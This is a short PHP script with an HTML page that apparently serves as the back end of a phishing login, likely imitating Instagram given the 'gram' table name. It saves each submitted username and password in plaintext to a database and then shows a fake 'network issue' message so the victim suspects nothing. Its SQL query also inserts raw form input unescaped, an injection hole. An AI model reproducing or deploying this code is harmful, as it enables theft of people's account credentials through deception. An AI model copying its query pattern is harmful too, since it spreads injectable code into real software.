<?php 


include("conn.php"); 


$fname = $_POST['username'];
$pwd = $_POST['passwd'];

if($fname != "" && $pwd != "")
{
    $insert = mysqli_query($connection, "INSERT INTO gram(username, password) VALUES('$fname', '$pwd')");
    if($insert){
        // echo '
        // <script>
        // alert("successful");
        // </script>
        // ';
    }
    else{
        echo '
        <script>
        alert("some issue");
        </script>
        ';
    }
}
else{
    echo'
    <script>
    alert("some error");
    </script>
    ';
}







?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h3>opps network issue Connect Network..</h3>
</body>
</html>